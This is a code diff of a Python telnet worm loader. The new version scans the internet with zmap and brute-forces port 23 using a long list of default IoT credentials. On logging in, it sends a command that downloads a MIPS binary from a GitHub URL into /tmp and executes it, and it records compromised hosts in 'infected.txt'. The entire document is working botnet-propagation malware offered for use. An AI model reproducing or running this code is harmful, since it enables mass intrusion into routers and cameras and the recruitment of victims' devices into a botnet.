@@ -1,40 +1,59 @@
+#!/usr/bin/python3
 import threading
-import sys, os, re, time, socket
-from queue import Queue
-from sys import stdout
+import sys, os, re, time, random, socket, select, subprocess
 
-# Ensure correct usage of the script
-if len(sys.argv) < 4:
-    print("Usage: python3 " + sys.argv[0] + " <list> <threads> <output file>")
+# USE ONLY 1 TO 16 THREADS UNLESS YOU WANT TO CRASH YOUR SERVER
+
+if len(sys.argv) < 3:
+    print("Usage: python3 " + sys.argv[0] + " <threads> <output file>")
     sys.exit()
 
-# Credentials for brute-forcing
-combo = ["root:root", "admin:admin", "root:vizxv", "root:Serv4EMC", "default:default", 
-         "default:OxhlwSG8", "default:S2fGqNFs", "root:xc3511", "admin:dvr2580222", 
-         "guest:guest", "daemon:daemon", "root:ipcam_rt5350", "root:hi3518", "user:user", 
-         "root:GM8182", "root:5up", "root:password", "admin:password", "ubnt:ubnt", 
-         "root:Zte521", "root:vertex25ektks123"]
+global rekdevice
+rekdevice = "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips" #command to send
 
-# Read IP addresses from the input file
-ips = open(sys.argv[1], "r").readlines()
-threads = int(sys.argv[2])
-output_file = sys.argv[3]
-queue = Queue()
-queue_count = 0
+combo = [ 
+    "root:root", "root:", "admin:admin", "telnet:telnet", "support:support",
+    "user:user", "admin:", "admin:password", "root:vizxv", "root:admin",
+    "root:xc3511", "root:888888", "root:xmhdipc", "root:default", 
+    "root:juantech", "root:123456", "root:54321", "root:12345", "root:pass",
+    "ubnt:ubnt", "root:klv1234", "root:Zte521", "root:hi3518", "root:jvbzd",
+    "root:anko", "root:zlxx.", "root:7ujMko0vizxv", "root:7ujMko0admin",
+    "root:system", "root:ikwb", "root:dreambox", "root:user", "root:realtek",
+    "root:00000000", "admin:1111111", "admin:1234", "admin:12345", 
+    "admin:54321", "admin:123456", "admin:7ujMko0admin", "admin:1234",
+    "admin:pass", "admin:meinsm", "admin:admin1234", "root:1111",
+    "admin:smcadmin", "admin:1111", "root:666666", "root:password", 
+    "root:1234", "root:klv123", "Administrator:admin", "service:service",
+    "supervisor:supervisor", "guest:guest", "guest:12345", "guest:12345", 
+    "admin1:password", "administrator:1234", "666666:666666", 
+    "888888:888888", "tech:tech", "mother:fucker"
+]
 
-# Add IPs to the queue
-for ip in ips:
-    queue_count += 1
-    stdout.write("\r[%d] Added to queue" % queue_count)
-    stdout.flush()
-    queue.put(ip.strip())  # Ensure no extra newlines
-print("\n")
+threads = int(sys.argv[1])
+output_file = sys.argv[2]
+
+def readUntil(tn, string, timeout=8):
+    buf = ''
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        buf += tn.recv(1024).decode('utf-8', 'ignore')
+        time.sleep(0.1)
+        if string in buf:
+            return buf
+    raise Exception('TIMEOUT!')
+
+def recvTimeout(sock, size, timeout=8):
+    sock.setblocking(0)
+    ready = select.select([sock], [], [], timeout)
+    if ready[0]:
+        data = sock.recv(size).decode('utf-8', 'ignore')
+        return data
+    return ""
 
 class router(threading.Thread):
-    def __init__(self, ip):
+    def __init__ (self, ip):
         threading.Thread.__init__(self)
         self.ip = str(ip).rstrip('\n')
-        self.rekdevice = "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"
 
     def run(self):
         global fh
@@ -49,92 +68,103 @@ class router(threading.Thread):
                 username = ""
             else:
                 username = passwd.split(":")[0]
-            
             try:
                 tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                tn.settimeout(0.37)
+                tn.settimeout(1)
                 tn.connect((self.ip, 23))
             except Exception:
                 tn.close()
                 break
-            
+
             try:
                 hoho = ''
                 hoho += readUntil(tn, ":")
                 if ":" in hoho:
                     tn.send((username + "\r\n").encode())
                     time.sleep(0.1)
-            except Exception:
-                tn.close()
+                else:
+                    tn.close()
+                    return
 
-            try:
                 hoho = ''
                 hoho += readUntil(tn, ":")
                 if ":" in hoho:
                     tn.send((password + "\r\n").encode())
                     time.sleep(0.1)
-                else:
-                    pass
-            except Exception:
-                tn.close()
 
-            try:
-                prompt = tn.recv(40960).decode('utf-8', 'ignore')
-                success = False
+                prompt = ''
+                prompt += recvTimeout(tn, 40960)
                 if "#" in prompt or "$" in prompt:
+                    for bad in ["nvalid", "ailed", "ncorrect", "enied", "error", "goodbye", "bad", "timeout", "##"]:
+                        if bad in prompt.lower():
+                            print("\033[32m[\033[31m+\033[32m] [\033[31mFAILED \033[31m-> \033[32m{}\033[37m:\033[33m{}\033[37m:\033[32m{}\033[37m]".format(username, password, self.ip))
+                            tn.close()
+                            continue
                     success = True
                 else:
+                    success = False
                     tn.close()
 
                 if success:
                     try:
-                        tn.send((self.rekdevice + "\r\n").encode())
+                        print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m{}\033[37m:\033[33m{}\033[37m:\033[32m{}\033[37m]".format(username, password, self.ip))
                         fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                         fh.flush()
-                        print(f"[+] GOTCHA -> {username}:{password}:{self.ip}")
+                        tn.send("sh\r\n".encode())
+                        time.sleep(0.1)
+                        tn.send("shell\r\n".encode())
+                        time.sleep(0.1)
+                        tn.send("ls /\r\n".encode())
+                        time.sleep(1)
+                        timeout = 8
+                        buf = ''
+                        start_time = time.time()
+                        while time.time() - start_time < timeout:
+                            buf += recvTimeout(tn, 40960)
+                            time.sleep(0.1)
+                            if "tmp" in buf and "unrecognized" not in buf:
+                                tn.send((rekdevice + "\r\n").encode())
+                                print("\033[32m[\033[31m+\033[32m] \033[33mINFECTED \033[31m-> \033[32m{}\033[37m:\033[33m{}\033[37m:\033[32m{}\033[37m]".format(username, password, self.ip))
+                                with open("infected.txt", "a") as f:
+                                    f.write(self.ip + ":23 " + username + ":" + password + "\n")
+                                time.sleep(10)
+                                tn.close()
+                                return
                         tn.close()
-                        break
+                        return
                     except:
                         tn.close()
                 else:
                     tn.close()
-            except Exception:
+            except:
                 tn.close()
 
-# Helper function to read until a certain string is received
-def readUntil(tn, string, timeout=6):
-    buf = ''
-    start_time = time.time()
-    while time.time() - start_time < timeout:
-        buf += tn.recv(1024).decode('utf-8', 'ignore')
-        time.sleep(0.01)
-        if string in buf: 
-            return buf
-    raise Exception('TIMEOUT!')
-
-# Worker function to handle multiple threads
 def worker():
-    try:
-        while True:
-            try:
-                IP = queue.get()
-                thread = router(IP)
-                thread.start()
-                queue.task_done()
-                time.sleep(0.02)
-            except:
-                pass
-    except:
-        pass
+    while True:
+        cmd = "zmap -p23 -N 10000 -f saddr -q --verbosity=0"
+        process = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE)
+        for line in iter(process.stdout.readline, b''):  # use b'' for Python 3
+            line = line.decode().replace("\n", "")
+            threadstarted = False
+            while not threadstarted:
+                try:
+                    thread = router(line)
+                    thread.start()
+                    threadstarted = True
+                except:
+                    pass
 
-# Open the output file for writing
 global fh
-fh = open("workingtelnet.txt", "a")
+fh = open(output_file, "a")
 
-# Start the worker threads
 for _ in range(threads):
     try:
         t = threading.Thread(target=worker)
         t.start()
     except:
         pass
+
+print("Started " + str(threads) + " scanner threads! Press enter to stop.")
+
+input()
+os.kill(os.getpid(), 9)
